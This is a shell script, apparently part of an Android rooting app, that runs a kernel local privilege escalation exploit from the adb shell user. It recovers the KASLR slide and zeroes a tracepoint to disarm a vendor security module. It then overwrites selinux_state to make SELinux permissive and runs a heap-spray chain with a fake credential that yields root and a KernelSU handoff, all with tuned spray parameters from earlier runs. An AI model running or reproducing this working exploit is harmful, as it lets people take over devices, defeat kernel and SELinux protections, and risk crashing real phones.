#!/system/bin/sh
# run_lpe.sh -- APK-side one-tap launcher for the POSIX CPU timer LPE.
#
# Runs as the adb shell identity (uid 2000 / u:r:shell:s0, SELinux enforcing)
# through the Shizuku user service.  Everything it writes lives under
# /data/local/tmp.  The whole plan is logged to the app's log file:
#
#   [1] ic-timer slide   -- recover this boot's KASLR slide from
#       sched_blocked_reason and print FUNCS / SELINUX_STATE / INIT_USER_NS.
#       Build-gated: the symbol table is for 6.1.145 gf506252fa70d and a
#       different kernel aborts before any kernel write.
#   [2] vr.ko disarm     -- zero __tracepoint_sys_exit->funcs with the AF_UNIX
#       8K zero-write, BEFORE the chain releases the fake-cred winner.  On
#       16.1.15.0 the winner died at its first syscall otherwise (ladder=1);
#       the X300/t28 fake chain does the same step before waking its child.
#       This is a full parked attempt, not a payload action.
#   [3] SELinux          -- on a stock policy, zero selinux_state-7 so only
#       `enforcing` is cleared and `initialized` survives, then gate on
#       `getenforce` + `policyvers`.  On a device that already has a
#       permissive u:r:ksu:s0 domain this step is skipped.
#   [4] mcast chain      -- with IC_REAL_INIT_USER_NS so the fake cred's
#       capabilities count in init_user_ns (ksud late-load needs
#       CAP_SYS_MODULE).  Payload = KSU handoff + proof.
#
# The chain environment below is the run18 (2026-10-25) validated one; the
# comments at the end of this header explain the knobs.
#
# Success looks like
#   [auto] zero selinux landed
#   [ctxmap] u:r:ksu:s0 = sid N
#   [helper] launched euid=0 ...
#   [ksu] late-load(allow-shell) rc=0
#   uid=0(root) ... LPE-PROOF
# A run with no "case L=" line just means every leak landed on an unsupported
# timer offset (7 of 31): rerun with more attempts after a reboot.
#
# SAFE_FILL (default 4000) makes a failed capture report "no leak" instead of
# panicking: the spray runs first, so a captured node is never touched.
# LATE_FILL (2000) takes pages freed late by call_rcu().  SKBF_MIN (8) frees
# only a handful of queued order-2 datagrams before the spray; freeing all
# 32320 (496 MB) buried the slab on the phone.  IC_ATTEMPT_WAIT is in 200 ms
# ticks (900 = 180 s) and must stay longer than an attempt: overlapping
# attempts steal each other's captured page (run20 panicked that way).
#
# Every attempt that leaks parks instead of exiting -- the stale timer node
# sits in one of our psl pages, and releasing the task would walk it.  Parked
# attempts keep ~600 psl sockets (~10 MB) until reboot and must NEVER be
# killed -9.  Reboot to clean them.

set -u
unset IC_EARLY_WAIT IC_EARLY_GATE
trap '' HUP INT TERM

ident() { getprop "$1" 2>/dev/null; }
devmem=$(sed -n 's/^MemTotal:[[:space:]]*\([0-9]*\).*/\1/p' /proc/meminfo 2>/dev/null)
echo "[dev] model=$(ident ro.product.model) device=$(ident ro.product.device) sdk=$(ident ro.build.version.sdk) build=$(ident ro.build.display.id) kernel=$(uname -r 2>/dev/null) arch=$(uname -m 2>/dev/null) mem=${devmem:-?}kB ksu=$( [ -d /data/adb/ksu ] && echo yes || echo no)"
echo "[dev] run uid=$(id -u 2>/dev/null) ctx=$(cat /proc/self/attr/current 2>/dev/null) enforce=$(getenforce 2>/dev/null) panicoops=$(cat /proc/sys/kernel/panic_on_oops 2>/dev/null)"
echo "[dev] version=$(cat /proc/version 2>/dev/null)"

DIR=/data/local/tmp
DROP="$DIR/ic-dropdir"
STAGE="$DIR/ic-stage"
BIN="${IC_BIN:-$DIR/ic-timer}"
ATTEMPTS="${ATTEMPTS:-16}"
[ -x "$BIN" ] || { echo "missing $BIN" >&2; exit 1; }
mkdir -p "$DROP" "$STAGE" || exit 1
chmod 0777 "$DROP" 2>/dev/null

# One parked zero-write attempt.  Returns 0 once "[zero] target=" appears,
# 1 on a reported miss/timeout.  The attempt itself keeps running (parked)
# on success -- never kill it.
zero_attempt() { # name target selinux
	zn=$1
	zt=$2
	zs=$3
	zlog="$DIR/zero-$zn.log"
	: > "$zlog"
	env PATH=/sbin:/system/bin:/system/xbin \
	    IC_PEAK=1 IC_FORK=1 IC_REVERSE=1 IC_PC=0 IC_PEAK_SKBF=1 \
	    IC_KEEP_POOL=1 IC_SKB_MIN=8 IC_AIO_NOFAULT=1 IC_AIO_NOREMAP=1 \
	    IC_ANON_PAGES=0 IC_AIO_EVENTS=1 IC_VMA_KEEP=10 IC_AIO_CTXS=16384 \
	    IC_VMA_PREWARM=16384 IC_STAGING_DIR="$STAGE" IC_FILP_SHIELD=18000 \
	    IC_KM64_SHIELD=4096 IC_ATTEMPT_WAIT=900 \
	    IC_ATTEMPTS="${ZERO_ATTEMPTS:-6}" IC_SAFE_FILL=4000 IC_SLABTRACE=1 \
	    IC_PAD_ALIGN=1 IC_PAD_KEEP=4185 IC_FLUSH_SPARSE=15 \
	    IC_SPRAY_EARLY=1 IC_EARLY_PRIME=1024 IC_EARLY_WAIT=1 \
	    IC_EARLY_GATE=1 IC_SKB_SOCKS=8 IC_SPRAY=unixstr \
	    IC_UNXSTR_MSGS=8192 IC_ZERO_TARGET="$zt" IC_ZERO_SELINUX="$zs" \
	    "$BIN" >> "$zlog" 2>&1 &
	i=0
	while [ $i -lt 600 ]; do
		if grep -q '\[zero\] target=' "$zlog" 2>/dev/null; then
			echo "[auto] zero $zn landed"
			cat "$zlog"
			return 0
		fi
		# A single "no leak" is only one attempt: the binary's
		# supervisor parks it and forks the next one (IC_ATTEMPTS).
		# Wait for the supervisor to give up ("no root after") or to
		# exit before declaring the phase failed; breaking on the
		# first miss threw away the remaining attempts.
		if grep -q 'no root after' "$zlog" 2>/dev/null; then
			break
		fi
		if ! kill -0 $! 2>/dev/null; then
			# The supervisor exited without a verdict (crash or
			# an emit we do not parse); take one more look below.
			break
		fi
		sleep 1
		i=$((i + 1))
	done
	echo "[auto] zero $zn failed"
	cat "$zlog"
	return 1
}

echo "[auto] [1/3] slide"
SLIDE_OUT=$("$BIN" slide 2>&1)
printf '%s\n' "$SLIDE_OUT"
SLIDE=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/^SLIDE=//p' | tail -n 1)
FUNCS=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/^FUNCS=//p' | tail -n 1)
STATE=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/^SELINUX_STATE=//p' | tail -n 1)
USRNS=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/^INIT_USER_NS=//p' | tail -n 1)
if [ -z "${SLIDE:-}" ] || [ -z "${FUNCS:-}" ] || [ -z "${STATE:-}" ] || [ -z "${USRNS:-}" ]; then
	echo "[auto] no usable slide for this boot; stopping before any kernel write"
	echo "[auto] send this log -- a different kernel build needs a new symbol table"
	exit 4
fi

VR=$(grep -c '^vr ' /proc/modules 2>/dev/null)
if [ "${VR:-0}" -gt 0 ]; then
	echo "[auto] [2/3] vr.ko present: zero funcs <- $FUNCS"
	zero_attempt funcs "$FUNCS" 0 || {
		echo "[auto] vr disarm failed; reboot and retry"
		exit 5
	}
else
	echo "[auto] [2/3] no vr module loaded; no disarm needed"
fi

CTX=u:r:ksu:s0
STOCK=${IC_STOCK:-auto}
if [ "$STOCK" = "auto" ]; then
	if [ -d /data/adb/ksu ]; then STOCK=0; else STOCK=1; fi
fi
if [ "$(getenforce 2>/dev/null)" = "Permissive" ]; then
	echo "[auto] SELinux already Permissive; no state write"
	STOCK=2
	CTX=u:r:shell:s0
fi
if [ "$STOCK" = "1" ]; then
	echo "[auto] stock policy: zero selinux_state-7 <- $STATE"
	zero_attempt selinux "$STATE" 1 || {
		echo "[auto] selinux zero failed; reboot and retry"
		exit 5
	}
	if [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then
		echo "[auto] still Enforcing after the write; STOP and reboot"
		exit 5
	fi
	if ! cat /sys/fs/selinux/policyvers >/dev/null 2>&1; then
		echo "[auto] policyvers unreadable = initialized cleared; REBOOT NOW"
		exit 6
	fi
	echo "[auto] SELinux Permissive, initialized intact"
	CTX=u:r:shell:s0
fi

# Older APKs prefixed the payload with their own disarm subshell; strip it so
# it cannot spawn a nested attempt after the pre-chain disarm above.
PAYLOAD_CMD=$(printf '%s\n' "${PAYLOAD_CMD:-id; cat /proc/self/attr/current; getenforce; echo LPE-PROOF}" | sed 's/^( IC_DISARM_VR=1 [^)]*) & //')

echo "[auto] [3/3] mcast chain ctxmap=$CTX userns=$USRNS attempts=$ATTEMPTS"
exec env PATH=/sbin:/system/bin:/system/xbin \
    IC_PEAK=1 \
    IC_FORK=1 \
    IC_REVERSE=1 \
    IC_PC=0 \
    IC_PEAK_SKBF=1 \
    IC_KEEP_POOL=1 \
    IC_SKBF_MIN="${SKBF_MIN:-8}" \
    IC_AIO_NOFAULT=1 \
    IC_AIO_NOREMAP=1 \
    IC_ANON_PAGES=0 \
    IC_AIO_EVENTS=1 \
    IC_VMA_KEEP=10 \
    IC_AIO_CTXS=16384 \
    IC_VMA_PREWARM=16384 \
    IC_STAGING_DIR="$STAGE" \
    IC_SPRAY=mcast \
    IC_FILP_SHIELD=18000 \
    IC_KM64_SHIELD=4096 \
    IC_ATTEMPT_WAIT="${IC_ATTEMPT_WAIT:-900}" \
    IC_ATTEMPTS="$ATTEMPTS" \
    IC_SCAN=1 \
    IC_SCAN_CTXMAP="$CTX" \
    IC_REAL_INIT_USER_NS="$USRNS" \
    IC_INTERN_SELF=1 \
    IC_PREP_DROP=1 \
    IC_SCAN_DROP_DIR="$DROP" \
    IC_DROP_MODE=7 \
    IC_SCAN_EXIT_AFTER_DROP=1 \
    IC_SAFE_FILL="${SAFE_FILL:-4000}" \
    IC_LATE_FILL="${LATE_FILL:-2000}" \
    IC_SLABSNAP=1 \
    IC_SLABTRACE=1 \
    IC_PAD_ALIGN=1 \
    IC_SPRAY_EARLY=1 \
    IC_EARLY_PRIME=1024 \
    IC_SKB_SOCKS=8 \
    IC_PAD_KEEP=4185 \
    IC_FLUSH_SPARSE=15 \
    IC_PAYLOAD_CMD="$PAYLOAD_CMD" \
    "$BIN"
